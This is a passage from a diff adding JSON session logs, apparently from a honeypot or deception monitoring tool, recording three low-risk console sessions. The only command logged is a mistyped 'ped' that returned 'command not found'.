+        "id": "cmd-1768682501555",
+        "timestamp": 1768682501555,
+        "command": "ped",
+        "output": "bash: ped: command not found...",
+        "threat": "normal",
+        "riskIncrease": 0
+      }
+    ],
+    "threatLevel": "low",
+    "behaviorTags": [
+      "New Connection"
+    ],
+    "deceptionStrategies": []
+  },
+  {
+    "id": "session-x30epava0",
+    "startTime": 1768682089998,
+    "lastActivity": 1768682089998,
+    "riskScore": 0,
+    "entryVector": "console",
+    "attackStage": "initial-access",
+    "isActive": false,
+    "commands": [],
+    "threatLevel": "low",
+    "behaviorTags": [
+      "New Connection"
+    ],
+    "deceptionStrategies": []
+  },
+  {
+    "id": "session-4br6j7dxz",
+    "startTime": 1768682080203,
+    "lastActivity": 1768682080203,
+    "riskScore": 0,
+    "entryVector": "console",
+    "attackStage": "initial-access",
+    "isActive": false,
+    "commands": [],
+    "threatLevel": "low",
+    "behaviorTags": [
+      "New Connection"
+    ],
+    "deceptionStrategies": []
+  }
+]
